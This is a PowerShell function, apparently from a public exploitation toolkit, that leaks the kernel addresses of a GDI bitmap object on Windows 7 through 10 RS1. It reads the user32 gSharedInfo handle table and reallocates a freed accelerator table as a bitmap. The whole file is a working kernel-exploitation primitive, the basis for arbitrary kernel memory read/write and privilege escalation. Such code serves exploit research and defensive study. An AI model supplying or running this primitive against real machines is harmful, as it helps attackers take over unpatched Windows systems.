function Stage-gSharedInfoBitmap {
<#
.SYNOPSIS
	Universal x32/x64 Bitmap leak using gSharedInfo.
	Targets: 7, 8, 8.1, 10, 10 RS1

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.EXAMPLE
	PS C:\Users\b33f> Stage-gSharedInfoBitmap |fl
	
	BitmapKernelObj : -7692235059200
	BitmappvScan0   : -7692235059120
	BitmapHandle    : 1845828432
	
	PS C:\Users\b33f> $Manager = Stage-gSharedInfoBitmap
	PS C:\Users\b33f> "{0:X}" -f $Manager.BitmapKernelObj
	FFFFF901030FF000
#>

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	public static class gSharedInfoBitmap
	{
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateBitmap(
		    int nWidth,
		    int nHeight,
		    uint cPlanes,
		    uint cBitsPerPel,
		    IntPtr lpvBits);

		[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
		    string lpFileName);
		
		[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
		    IntPtr hModule,
		    string procName);

		[DllImport("user32.dll")]
		public static extern IntPtr CreateAcceleratorTable(
		    IntPtr lpaccl,
		    int cEntries);

		[DllImport("user32.dll")]
		public static extern bool DestroyAcceleratorTable(
		    IntPtr hAccel);
	}
"@

	# Check Arch
	if ([System.IntPtr]::Size -eq 4) {
		$x32 = 1
	}

	function Create-AcceleratorTable {
	    [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000)
	    $AccelHandle = [gSharedInfoBitmap]::CreateAcceleratorTable($Buffer, 700) # +4 kb size
	    $User32Hanle = [gSharedInfoBitmap]::LoadLibrary("user32.dll")
	    $gSharedInfo = [gSharedInfoBitmap]::GetProcAddress($User32Hanle, "gSharedInfo")
	    if ($x32){
	        $gSharedInfo = $gSharedInfo.ToInt32()
	    } else {
	        $gSharedInfo = $gSharedInfo.ToInt64()
	    }
	    $aheList = $gSharedInfo + [System.IntPtr]::Size
	    if ($x32){
	        $aheList = [System.Runtime.InteropServices.Marshal]::ReadInt32($aheList)
	        $HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0xc # _HANDLEENTRY.Size = 0xC
	        $phead = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleEntry)
	    } else {
	        $aheList = [System.Runtime.InteropServices.Marshal]::ReadInt64($aheList)
	        $HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0x18 # _HANDLEENTRY.Size = 0x18
	        $phead = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleEntry)
	    }

	    $Result = @()
	    $HashTable = @{
	        Handle = $AccelHandle
	        KernelObj = $phead
	    }
	    $Object = New-Object PSObject -Property $HashTable
	    $Result += $Object
	    $Result
	}

	function Destroy-AcceleratorTable {
	    param ($Hanlde)
	    $CallResult = [gSharedInfoBitmap]::DestroyAcceleratorTable($Hanlde)
	}

	$KernelArray = @()
	for ($i=0;$i -lt 20;$i++) {
	    $KernelArray += Create-AcceleratorTable
	    if ($KernelArray.Length -gt 1) {
	        if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) {
	            Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
	            [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
	            $BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x701, 2, 1, 8, $Buffer) # # +4 kb size -lt AcceleratorTable
	            break
	        }
	    }
	    Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
	}

	$BitMapObject = @()
	$HashTable = @{
	    BitmapHandle = $BitmapHandle
	    BitmapKernelObj = $($KernelArray[$i].KernelObj)
	    BitmappvScan0 = if ($x32) {$($KernelArray[$i].KernelObj) + 0x32} else {$($KernelArray[$i].KernelObj) + 0x50}
	}
	$Object = New-Object PSObject -Property $HashTable
	$BitMapObject += $Object
	$BitMapObject
}